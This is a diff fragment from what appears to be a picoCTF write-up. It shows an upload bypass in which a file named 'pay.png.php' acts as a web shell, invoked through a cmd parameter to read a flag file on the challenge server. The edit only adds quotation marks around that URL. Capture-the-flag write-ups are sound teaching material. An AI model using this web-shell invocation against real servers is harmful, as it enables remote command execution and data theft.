@@ -114,7 +114,7 @@ Content-Type: image/png
 
 Forward this request and file will be uploaded.
 
-Now navigate to http://atlas.picoctf.net:52670/uploads/pay.png.php?cmd=cat /var/www/html/GQ4DOOBVMMYGK.txt
+Now navigate to "http://atlas.picoctf.net:52670/uploads/pay.png.php?cmd=cat /var/www/html/GQ4DOOBVMMYGK.txt"
 
 `Note : I found "/var/www/html/GQ4DOOBVMMYGK.txt" by using "find / flag" command which revealed all files and to the very end this file caught my eye.`
 
